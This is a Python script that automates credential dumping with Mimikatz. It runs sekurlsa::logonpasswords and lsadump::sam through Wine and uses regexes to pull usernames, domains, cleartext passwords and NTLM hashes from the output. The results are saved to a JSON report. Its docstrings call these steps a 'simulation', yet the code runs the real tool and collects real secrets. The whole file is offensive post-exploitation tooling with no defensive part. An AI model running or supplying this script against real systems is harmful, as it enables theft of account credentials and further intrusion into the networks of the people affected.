#!/usr/bin/env python3
# File: extract_credentials.py

import subprocess
import re
import json
from datetime import datetime


class CredentialExtractor:

    def __init__(self):
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'credentials': [],
            'hashes': []
        }

    def extract_logon_passwords(self):
        """
        Execute Mimikatz sekurlsa::logonpasswords simulation.
        """

        try:
            process = subprocess.run(
                ["wine", "mimikatz.exe", "sekurlsa::logonpasswords", "exit"],
                capture_output=True,
                text=True
            )

            output = process.stdout
            parsed = self.parse_mimikatz_output(output)
            self.results['credentials'].extend(parsed)

        except Exception as e:
            print(f"[!] Error executing Mimikatz: {e}")

    def parse_mimikatz_output(self, output):
        """
        Parse Mimikatz output and extract credential information.
        """

        credentials = []

        pattern = re.compile(
            r"\*\s+Username\s*:\s*(.+?)\n.*?"
            r"\*\s+Domain\s*:\s*(.+?)\n.*?"
            r"\*\s+Password\s*:\s*(.+?)\n.*?"
            r"\*\s+NTLM\s*:\s*([a-fA-F0-9]{32})",
            re.DOTALL
        )

        matches = pattern.findall(output)

        for match in matches:
            credentials.append({
                "username": match[0].strip(),
                "domain": match[1].strip(),
                "password": match[2].strip(),
                "ntlm_hash": match[3].strip()
            })

        return credentials

    def extract_sam_hashes(self):
        """
        Execute lsadump::sam simulation.
        """

        try:
            process = subprocess.run(
                ["wine", "mimikatz.exe", "lsadump::sam", "exit"],
                capture_output=True,
                text=True
            )

            output = process.stdout

            hash_pattern = re.compile(
                r"User\s*:\s*(.+?)\n.*?Hash NTLM:\s*([a-fA-F0-9]{32})",
                re.DOTALL
            )

            matches = hash_pattern.findall(output)

            for match in matches:
                self.results['hashes'].append({
                    "username": match[0].strip(),
                    "ntlm_hash": match[1].strip()
                })

        except Exception as e:
            print(f"[!] Error extracting SAM hashes: {e}")

    def generate_report(self):

        report_file = "extraction_report.json"

        with open(report_file, "w") as f:
            json.dump(self.results, f, indent=4)

        print("\n=== Extraction Summary ===")
        print(f"Timestamp: {self.results['timestamp']}")
        print(f"Credentials Found: {len(self.results['credentials'])}")
        print(f"SAM Hashes Found: {len(self.results['hashes'])}")
        print(f"Report saved to {report_file}")


def main():
    extractor = CredentialExtractor()
    extractor.extract_logon_passwords()
    extractor.extract_sam_hashes()
    extractor.generate_report()


if __name__ == "__main__":
    main()
